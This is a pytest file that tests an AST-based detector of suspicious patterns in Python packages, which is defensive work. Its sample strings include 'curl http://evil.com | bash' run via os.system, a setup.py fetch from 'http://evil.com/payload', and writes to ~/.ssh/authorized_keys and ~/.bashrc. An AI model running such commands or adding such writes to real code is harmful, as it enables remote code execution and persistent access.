"""
Tests for the payload analyzer (AST-based static analysis).
"""

import ast
import pytest

from uast.payload import SuspiciousPatternVisitor, PayloadAnalyzer


class TestSuspiciousPatternVisitor:

    def _visit(self, code: str, is_setup: bool = False) -> list:
        tree = ast.parse(code)
        visitor = SuspiciousPatternVisitor("test.py", is_setup_file=is_setup)
        visitor.visit(tree)
        return visitor.findings

    # -- PAYLOAD-001: Environment variable gating -----------------------------

    def test_detects_os_getenv(self):
        code = """
import os
if os.getenv("PRODUCTION"):
    do_something()
"""
        findings = self._visit(code)
        assert any(f.signal_id == "PAYLOAD-001" for f in findings)

    def test_detects_os_environ_get(self):
        code = """
import os
val = os.environ.get("SECRET_KEY")
"""
        findings = self._visit(code)
        assert any(f.signal_id == "PAYLOAD-001" for f in findings)

    # -- PAYLOAD-002: Subprocess/os.system calls ------------------------------

    def test_detects_subprocess_run(self):
        code = """
import subprocess
subprocess.run(["curl", "http://evil.com"])
"""
        findings = self._visit(code)
        assert any(f.signal_id == "PAYLOAD-002" for f in findings)

    def test_detects_os_system(self):
        code = """
import os
os.system("curl http://evil.com | bash")
"""
        findings = self._visit(code)
        assert any(f.signal_id == "PAYLOAD-002" for f in findings)

    def test_detects_subprocess_popen(self):
        code = """
import subprocess
p = subprocess.Popen(["sh", "-c", "whoami"])
"""
        findings = self._visit(code)
        assert any(f.signal_id == "PAYLOAD-002" for f in findings)

    # -- PAYLOAD-003: Base64/codecs obfuscation -------------------------------

    def test_detects_base64_decode_with_literal(self):
        code = """
import base64
data = base64.b64decode("aGVsbG8=")
"""
        findings = self._visit(code)
        assert any(f.signal_id == "PAYLOAD-003" for f in findings)

    def test_no_flag_base64_decode_with_variable(self):
        code = """
import base64
data = base64.b64decode(encoded_var)
"""
        findings = self._visit(code)
        assert not any(f.signal_id == "PAYLOAD-003" for f in findings)

    # -- PAYLOAD-004: Network calls in setup.py -------------------------------

    def test_detects_network_in_setup(self):
        code = """
import urllib.request
data = urllib.request.urlopen("http://evil.com/payload")
"""
        findings = self._visit(code, is_setup=True)
        assert any(f.signal_id == "PAYLOAD-004" for f in findings)

    def test_no_flag_network_in_regular_file(self):
        code = """
import urllib.request
data = urllib.request.urlopen("http://api.example.com/data")
"""
        findings = self._visit(code, is_setup=False)
        assert not any(f.signal_id == "PAYLOAD-004" for f in findings)

    # -- PAYLOAD-005: eval()/exec() with non-literal --------------------------

    def test_detects_eval_with_variable(self):
        code = """
user_input = get_input()
eval(user_input)
"""
        findings = self._visit(code)
        assert any(f.signal_id == "PAYLOAD-005" for f in findings)

    def test_no_flag_eval_with_literal(self):
        code = """
eval("2 + 2")
"""
        findings = self._visit(code)
        assert not any(f.signal_id == "PAYLOAD-005" for f in findings)

    def test_detects_exec_with_variable(self):
        code = """
code = compile_something()
exec(code)
"""
        findings = self._visit(code)
        assert any(f.signal_id == "PAYLOAD-005" for f in findings)

    # -- PAYLOAD-006: Dynamic imports -----------------------------------------

    def test_detects_dynamic_import_variable(self):
        code = """
module_name = get_module()
__import__(module_name)
"""
        findings = self._visit(code)
        assert any(f.signal_id == "PAYLOAD-006" for f in findings)

    def test_no_flag_import_with_literal(self):
        code = """
__import__("os")
"""
        findings = self._visit(code)
        assert not any(f.signal_id == "PAYLOAD-006" for f in findings)

    # -- PAYLOAD-007: Sensitive file writes -----------------------------------

    def test_detects_ssh_write(self):
        code = """
f = open("/home/user/.ssh/authorized_keys", "w")
f.write("ssh-rsa AAAA...")
"""
        findings = self._visit(code)
        assert any(f.signal_id == "PAYLOAD-007" for f in findings)

    def test_detects_bashrc_write(self):
        code = """
with open("/home/user/.bashrc", "a") as f:
    f.write("export EVIL=true")
"""
        findings = self._visit(code)
        assert any(f.signal_id == "PAYLOAD-007" for f in findings)

    def test_no_flag_normal_file_write(self):
        code = """
with open("output.txt", "w") as f:
    f.write("hello")
"""
        findings = self._visit(code)
        assert not any(f.signal_id == "PAYLOAD-007" for f in findings)

    def test_no_flag_file_read(self):
        code = """
with open("/etc/hosts", "r") as f:
    content = f.read()
"""
        findings = self._visit(code)
        assert not any(f.signal_id == "PAYLOAD-007" for f in findings)


class TestPayloadAnalyzer:

    def test_findings_to_signals_deduplicates(self):
        from uast.payload import PayloadFinding
        analyzer = PayloadAnalyzer()

        findings = [
            PayloadFinding("PAYLOAD-002", "high", "subprocess", "detail1", "a.py", 1, 0.7),
            PayloadFinding("PAYLOAD-002", "high", "subprocess", "detail2", "b.py", 5, 0.7),
            PayloadFinding("PAYLOAD-005", "medium", "eval", "detail3", "c.py", 10, 0.5),
        ]

        signals = analyzer._findings_to_signals(findings)
        signal_ids = [s.signal_id for s in signals]
        # Should have exactly 2 unique signal IDs
        assert len(signal_ids) == 2
        assert "PAYLOAD-002" in signal_ids
        assert "PAYLOAD-005" in signal_ids

        # PAYLOAD-002 should mention "2 occurrences"
        payload_002 = next(s for s in signals if s.signal_id == "PAYLOAD-002")
        assert "2 occurrences" in payload_002.detail

    def test_empty_findings(self):
        analyzer = PayloadAnalyzer()
        signals = analyzer._findings_to_signals([])
        assert signals == []
